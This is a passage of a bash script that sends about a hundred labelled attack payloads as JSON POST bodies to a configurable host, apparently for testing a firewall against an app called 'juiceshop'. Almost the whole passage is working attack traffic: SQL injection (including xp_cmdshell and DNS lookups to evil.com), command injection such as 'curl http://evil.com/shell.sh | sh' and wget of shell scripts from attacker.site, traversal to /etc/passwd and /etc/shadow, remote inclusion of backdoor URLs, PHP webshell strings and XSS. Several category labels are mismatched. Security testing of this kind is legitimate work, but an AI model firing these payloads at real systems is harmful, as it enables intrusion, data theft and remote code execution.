curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''; EXEC xp_cmdshell('\''whoami'\'') --"}' | head -8
echo
echo "=== juiceshop-0093 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'') OR ('\''1'\''='\''1'\'' --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'') OR ('\''1'\''='\''1'\'' --"}' | head -8
echo
echo "=== juiceshop-0094 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'') AND sleep(5)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'') AND sleep(5)--"}' | head -8
echo
echo "=== juiceshop-0095 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%20%271%27%3D%271'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%20%271%27%3D%271"}' | head -8
echo
echo "=== juiceshop-0096 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1%27%20AND%201%3D1%20--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1%27%20AND%201%3D1%20--"}' | head -8
echo
echo "=== juiceshop-0097 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1%27)%20OR%20(%271%27%3D%271'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1%27)%20OR%20(%271%27%3D%271"}' | head -8
echo
echo "=== juiceshop-0098 | tuning=base64 | method=POST-body ==="
printf '    payload: %s\n' 'JyBPUiAnMT0nJz0nMQ=='
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "JyBPUiAnMT0nJz0nMQ=="}' | head -8
echo
echo "=== juiceshop-0099 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/**/OR/**/'\''1'\''/**/=/**/'\''1"}' | head -8
echo
echo "=== juiceshop-0100 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''UNION/**/SELECT/**/NULL,NULL--"}' | head -8
echo
echo "=== juiceshop-0101 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1%a0OR%a01=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1%a0OR%a01=1"}' | head -8
echo
echo "=== juiceshop-0102 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''/*!50000OR*/'\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\''/*!50000OR*/'\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0103 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1/**/UNION/**/SELECT/**/version()--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1/**/UNION/**/SELECT/**/version()--"}' | head -8
echo
echo "=== juiceshop-0104 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ''\''#'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''#"}' | head -8
echo
echo "=== juiceshop-0105 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin'\''--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin'\''--"}' | head -8
echo
echo "=== juiceshop-0106 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND sleep(5)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND sleep(5)--"}' | head -8
echo
echo "=== juiceshop-0107 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1 LIMIT 1 OFFSET 1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1 LIMIT 1 OFFSET 1--"}' | head -8
echo
echo "=== juiceshop-0108 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||UTL_INADDR.get_host_address('\''evil.com'\'')||'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||UTL_INADDR.get_host_address('\''evil.com'\'')||"}' | head -8
echo
echo "=== juiceshop-0109 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/*!50000UNION*/ SELECT 1,2--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/*!50000UNION*/ SELECT 1,2--"}' | head -8
echo
echo "=== juiceshop-0110 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''UNION SELECT /*!12345null*/,version()#'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''UNION SELECT /*!12345null*/,version()#"}' | head -8
echo
echo "=== juiceshop-0111 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' /*!OR*/ '\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' /*!OR*/ '\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0112 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1-- -'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1-- -"}' | head -8
echo
echo "=== juiceshop-0113 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' OR '\''1'\''='\''1'\'' --+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' OR '\''1'\''='\''1'\'' --+"}' | head -8
echo
echo "=== juiceshop-0114 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1;--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1;--+"}' | head -8
echo
echo "=== juiceshop-0115 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%201%3D1--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%201%3D1--+"}' | head -8
echo
echo "=== juiceshop-0116 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27/*!UNION*/%20SELECT%201,2--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27/*!UNION*/%20SELECT%201,2--"}' | head -8
echo
echo "=== juiceshop-0117 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1%2520--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2527%2520OR%25201%253D1%2520--"}' | head -8
echo
echo "=== juiceshop-0118 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' ';`id`'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": ";`id`"}' | head -8
echo
echo "=== juiceshop-0119 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%26%26sleep%205'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%26%26sleep%205"}' | head -8
echo
echo "=== juiceshop-0120 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%26%26cat%20/etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%26%26cat%20/etc/passwd"}' | head -8
echo
echo "=== juiceshop-0121 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Bping%20-c%204%20evil.com'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Bping%20-c%204%20evil.com"}' | head -8
echo
echo "=== juiceshop-0122 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%60whoami%60'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%60whoami%60"}' | head -8
echo
echo "=== juiceshop-0123 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '|curl$\{IFS\}evil.com'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "|curl$\\{IFS\\}evil.com"}' | head -8
echo
echo "=== juiceshop-0124 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '|wget$\{IFS\}attacker.site%2fshell.sh'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "|wget$\\{IFS\\}attacker.site%2fshell.sh"}' | head -8
echo
echo "=== juiceshop-0125 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '%2526%2526whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2526%2526whoami"}' | head -8
echo
echo "=== juiceshop-0126 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '$\{@print(md5(1234))\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{@print(md5(1234))\\}"}' | head -8
echo
echo "=== juiceshop-0127 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'php://input'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "php://input"}' | head -8
echo
echo "=== juiceshop-0128 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ''\'';phpinfo();/*'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'';phpinfo();/*"}' | head -8
echo
echo "=== juiceshop-0129 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'eval(base64_decode($_GET[cmd]))'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "eval(base64_decode($_GET[cmd]))"}' | head -8
echo
echo "=== juiceshop-0130 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'system($_GET['\''cmd'\''])'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "system($_GET['\''cmd'\''])"}' | head -8
echo
echo "=== juiceshop-0131 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%60curl$\{IFS\}attacker.com%60'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%60curl$\\{IFS\\}attacker.com%60"}' | head -8
echo
echo "=== juiceshop-0132 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ''\'';`wget attacker.sh`;//'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'';`wget attacker.sh`;//"}' | head -8
echo
echo "=== juiceshop-0133 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' ';id'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": ";id"}' | head -8
echo
echo "=== juiceshop-0134 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '| whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "| whoami"}' | head -8
echo
echo "=== juiceshop-0135 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '`whoami`'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "`whoami`"}' | head -8
echo
echo "=== juiceshop-0136 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '& uname -a'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "& uname -a"}' | head -8
echo
echo "=== juiceshop-0137 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&& ping -c 3 attacker.com'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&& ping -c 3 attacker.com"}' | head -8
echo
echo "=== juiceshop-0138 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '| powershell -Command "whoami"'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "| powershell -Command \"whoami\""}' | head -8
echo
echo "=== juiceshop-0139 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '; curl http://evil.com/shell.sh | sh'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "; curl http://evil.com/shell.sh | sh"}' | head -8
echo
echo "=== juiceshop-0140 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '$\{@print(md5(1))\}'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$\\{@print(md5(1))\\}"}' | head -8
echo
echo "=== juiceshop-0141 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%26%26%20whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%26%26%20whoami"}' | head -8
echo
echo "=== juiceshop-0142 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '%3B%20id'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3B%20id"}' | head -8
echo
echo "=== juiceshop-0143 | tuning=cmdi | method=POST-body ==="
printf '    payload: %s\n' '%60uname%20-a%60'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%60uname%20-a%60"}' | head -8
echo
echo "=== juiceshop-0144 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '|c%75rl http://evil.com'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "|c%75rl http://evil.com"}' | head -8
echo
echo "=== juiceshop-0145 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '$IFS$9$IFS$9whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "$IFS$9$IFS$9whoami"}' | head -8
echo
echo "=== juiceshop-0146 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' ';& whoami'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": ";& whoami"}' | head -8
echo
echo "=== juiceshop-0147 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../../../../etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../../../../etc/passwd"}' | head -8
echo
echo "=== juiceshop-0148 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"}' | head -8
echo
echo "=== juiceshop-0149 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '....//....//....//etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "....//....//....//etc/passwd"}' | head -8
echo
echo "=== juiceshop-0150 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}' | head -8
echo
echo "=== juiceshop-0151 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%252e%252e%252fetc%252fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%252e%252e%252fetc%252fpasswd"}' | head -8
echo
echo "=== juiceshop-0152 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'php://filter/convert.base64-encode/resource=index.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "php://filter/convert.base64-encode/resource=index.php"}' | head -8
echo
echo "=== juiceshop-0153 | tuning=lfi | method=POST-body ==="
printf '    payload: %s\n' 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="}' | head -8
echo
echo "=== juiceshop-0154 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../../etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../../etc/passwd"}' | head -8
echo
echo "=== juiceshop-0155 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../boot.ini'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../boot.ini"}' | head -8
echo
echo "=== juiceshop-0156 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../../../../windows/win.ini'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../../../../windows/win.ini"}' | head -8
echo
echo "=== juiceshop-0157 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../.../.../.../.../.../.../etc/shadow'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../.../.../.../.../.../.../etc/shadow"}' | head -8
echo
echo "=== juiceshop-0158 | tuning=lfi | method=POST-body ==="
printf '    payload: %s\n' 'expect://id'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "expect://id"}' | head -8
echo
echo "=== juiceshop-0159 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../../../../etc/passwd%00'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../../../../etc/passwd%00"}' | head -8
echo
echo "=== juiceshop-0160 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%2f..%2f..%2f..%2fetc%2fpasswd"}' | head -8
echo
echo "=== juiceshop-0161 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..%252f..%252f..%252fetc%252fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%252f..%252f..%252fetc%252fpasswd"}' | head -8
echo
echo "=== juiceshop-0162 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..//..//..//etc//passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..//..//..//etc//passwd"}' | head -8
echo
echo "=== juiceshop-0163 | tuning=lfi | method=POST-body ==="
printf '    payload: %s\n' '..%c0%af..%c0%afetc%c0%afpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%c0%af..%c0%afetc%c0%afpasswd"}' | head -8
echo
echo "=== juiceshop-0164 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '....//....//etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "....//....//etc/passwd"}' | head -8
echo
echo "=== juiceshop-0165 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '..%c0%af..%c0%afetc%2fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "..%c0%af..%c0%afetc%2fpasswd"}' | head -8
echo
echo "=== juiceshop-0166 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '../../../etc/passwd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "../../../etc/passwd"}' | head -8
echo
echo "=== juiceshop-0167 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}' | head -8
echo
echo "=== juiceshop-0168 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http://evil.com/shell.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://evil.com/shell.txt"}' | head -8
echo
echo "=== juiceshop-0169 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' '%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"}' | head -8
echo
echo "=== juiceshop-0170 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'https://evil.com/backdoor.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "https://evil.com/backdoor.php"}' | head -8
echo
echo "=== juiceshop-0171 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' '%252f%252fmalicious.com%252fshell.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%252f%252fmalicious.com%252fshell.txt"}' | head -8
echo
echo "=== juiceshop-0172 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' '%5c%5cattacker.com%5cbackdoor.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%5c%5cattacker.com%5cbackdoor.txt"}' | head -8
echo
echo "=== juiceshop-0173 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'https://attacker.site/malware.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "https://attacker.site/malware.php"}' | head -8
echo
echo "=== juiceshop-0174 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http://evil.com/shell.txt?'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://evil.com/shell.txt?"}' | head -8
echo
echo "=== juiceshop-0175 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'http://127.0.0.1/evil.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://127.0.0.1/evil.txt"}' | head -8
echo
echo "=== juiceshop-0176 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'http://[::]/evil.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://[::]/evil.php"}' | head -8
echo
echo "=== juiceshop-0177 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http%3A%2F%2Fevil.com%2Fshell.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http%3A%2F%2Fevil.com%2Fshell.txt"}' | head -8
echo
echo "=== juiceshop-0178 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'http%3A%2F%2F127.0.0.1%2Fevil.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http%3A%2F%2F127.0.0.1%2Fevil.txt"}' | head -8
echo
echo "=== juiceshop-0179 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http://evil.com%00/shell.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://evil.com%00/shell.php"}' | head -8
echo
echo "=== juiceshop-0180 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http://evil.com//shell.txt'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://evil.com//shell.txt"}' | head -8
echo
echo "=== juiceshop-0181 | tuning=rfi | method=POST-body ==="
printf '    payload: %s\n' 'http://ev%69l.com/shell.php'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "http://ev%69l.com/shell.php"}' | head -8
echo
echo "=== juiceshop-0182 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "eval(String.fromCharCode(97,108,101,114,116,40,49,41))"}' | head -8
echo
echo "=== juiceshop-0183 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'new%20Function('\''alert(1)'\'')()'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "new%20Function('\''alert(1)'\'')()"}' | head -8
echo
echo "=== juiceshop-0184 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'setTimeout('\''%61lert(1)'\'',1000)'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "setTimeout('\''%61lert(1)'\'',1000)"}' | head -8
echo
echo "=== juiceshop-0185 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' 'document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "document['\''write'\'']('\''<img src=x onerror=alert(1)>'\'')"}' | head -8
echo
echo "=== juiceshop-0186 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<img src="x" onerror="alert(1)">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<img src=\"x\" onerror=\"alert(1)\">"}' | head -8
echo
echo "=== juiceshop-0187 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<a href="javascript:alert(1)">XSS</a>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<a href=\"javascript:alert(1)\">XSS</a>"}' | head -8
echo
